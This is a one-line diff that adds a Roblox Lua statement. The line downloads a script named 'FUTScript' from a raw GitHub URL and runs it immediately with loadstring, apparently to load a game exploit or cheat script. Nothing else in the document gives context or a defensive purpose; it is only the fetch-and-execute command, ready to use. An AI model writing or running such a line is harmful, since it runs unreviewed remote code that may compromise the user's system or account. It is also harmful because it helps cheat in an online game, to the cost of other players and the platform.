@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TestJordnAccount/FUT/refs/heads/main/FUTScript"))();
